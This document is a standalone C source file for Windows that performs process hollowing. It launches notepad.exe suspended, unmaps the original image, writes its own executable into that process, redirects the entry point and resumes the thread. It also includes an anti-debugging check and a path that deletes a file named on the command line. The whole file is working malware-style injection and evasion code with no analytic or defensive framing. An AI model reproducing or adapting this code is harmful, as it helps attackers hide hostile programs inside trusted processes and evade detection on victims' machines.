#include <SDKDDKVer.h>
#include <stdio.h>
#include <tchar.h>
#include <stdio.h>
#include <Windows.h>
char curPath[MAX_PATH];
char dirPath[MAX_PATH];

NTSTATUS(NTAPI*pNtUnmapViewOfSection)		(HANDLE, PVOID);
NTSTATUS(NTAPI*pNtWriteVirtualMemory)		(HANDLE, PVOID, PVOID, ULONG, PULONG OPTIONAL);
NTSTATUS(NTAPI*pNtReadVirtualMemory)		(HANDLE, PVOID, PVOID, ULONG, PULONG OPTIONAL);
NTSTATUS(NTAPI*pNtResumeThread)				(HANDLE, PULONG OPTIONAL);
NTSTATUS(NTAPI*pNtGetContextThread)			(HANDLE, PCONTEXT);
NTSTATUS(NTAPI*pNtSetContextThread)			(HANDLE, PCONTEXT);
NTSTATUS(NTAPI*pNtQueryInformationProcess)	(HANDLE, UINT, PVOID, ULONG, PULONG);

#define NT_SUCCESS 0x00000000
int CALLBACK WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	GetModuleFileNameA(0, dirPath, MAX_PATH);
	GetModuleFileNameA(0, curPath, MAX_PATH);
	*(strrchr(dirPath, '\\')) = 0;

	if (lpCmdLine[0])
	{
		Sleep(0);
		DeleteFileA(lpCmdLine);
		goto subExit;
	}

	HMODULE dll = LoadLibraryA("ntdll.dll");
	pNtUnmapViewOfSection = (NTSTATUS(NTAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection");
	pNtReadVirtualMemory = (NTSTATUS(NTAPI*) (HANDLE, PVOID, PVOID, ULONG, PULONG))GetProcAddress(dll, "NtReadVirtualMemory");
	pNtWriteVirtualMemory = (NTSTATUS(NTAPI*) (HANDLE, PVOID, PVOID, ULONG,PULONG OPTIONAL))GetProcAddress(dll, "NtWriteVirtualMemory");
	pNtSetContextThread = (NTSTATUS(NTAPI*) (HANDLE, PCONTEXT))GetProcAddress(dll, "NtSetContextThread");
	pNtGetContextThread = (NTSTATUS(NTAPI*)(HANDLE,PCONTEXT))GetProcAddress(dll, "NtGetContextThread");
	pNtResumeThread = (NTSTATUS(NTAPI*)(HANDLE,PULONG  OPTIONAL))GetProcAddress(dll, "NtResumeThread");
	pNtQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, UINT, PVOID, ULONG, PULONG))GetProcAddress(dll, "NtQueryInformationProcess");

	PVOID pExe, Allocated, OEP;
	DWORD i, read, noDebuginherit = 0, fileLen;
	HANDLE hpExe;
	IMAGE_DOS_HEADER * IDH;
	IMAGE_NT_HEADERS  * INH;
	IMAGE_SECTION_HEADER  * ISH;

	STARTUPINFOA StartInfo = {};
	PROCESS_INFORMATION ProcInfo = {};
	CONTEXT ThreadContext;

	if ((pNtQueryInformationProcess(GetCurrentProcess(), 0x7, &noDebuginherit, 4, NULL)) != NT_SUCCESS) goto subExit;

	char argTemp[MAX_PATH] = " ";
	strcat(argTemp, curPath);
	if (!CreateProcessA("C:\\Windows\\notepad.exe", argTemp, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &StartInfo, &ProcInfo))
		goto subExit;
	

	ThreadContext.ContextFlags = CONTEXT_FULL;
	hpExe = CreateFileA(curPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hpExe == INVALID_HANDLE_VALUE) goto subExit;

	fileLen = GetFileSize(hpExe, NULL);
	pExe = VirtualAlloc(NULL, fileLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	ReadFile(hpExe, pExe, fileLen, &read, NULL);


	IDH = (PIMAGE_DOS_HEADER)pExe; //Executeable file dos header
	INH = (PIMAGE_NT_HEADERS)((LPBYTE)pExe + IDH->e_lfanew); //Executeable file NT header
	pNtGetContextThread(ProcInfo.hThread, &ThreadContext);
	pNtReadVirtualMemory(ProcInfo.hProcess, (PVOID)(ThreadContext.Ebx + 8), &OEP, sizeof(PVOID), NULL); //Record OEP of process

	pNtUnmapViewOfSection(ProcInfo.hProcess, OEP); //unmap original entry pointer
	Allocated = VirtualAllocEx(ProcInfo.hProcess, (PVOID)INH->OptionalHeader.ImageBase, INH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if ((DWORD)Allocated != INH->OptionalHeader.ImageBase) goto subExit;
	if (pNtWriteVirtualMemory(ProcInfo.hProcess, Allocated, pExe, INH->OptionalHeader.SizeOfHeaders, NULL) != NT_SUCCESS) goto subExit;

	for (i = 0; i< (INH->FileHeader.NumberOfSections); i++) // reloc all sections
	{
		ISH = (PIMAGE_SECTION_HEADER)((LPBYTE)pExe + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i*sizeof(IMAGE_SECTION_HEADER)));
		pNtWriteVirtualMemory(ProcInfo.hProcess, (PVOID)((LPBYTE)Allocated + ISH->VirtualAddress), (PVOID)((LPBYTE)pExe + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
	}

	ThreadContext.Eax = (DWORD)((LPBYTE)Allocated + INH->OptionalHeader.AddressOfEntryPoint); //Set new entry pointer
	pNtWriteVirtualMemory(ProcInfo.hProcess, (PVOID)(ThreadContext.Ebx + 8), &INH->OptionalHeader.ImageBase, sizeof(PVOID), NULL); //Set image base
	pNtSetContextThread(ProcInfo.hThread, &ThreadContext);
	if (pNtResumeThread(ProcInfo.hThread, NULL) != NT_SUCCESS) goto subExit;

subExit:
	ExitProcess(NULL);
}

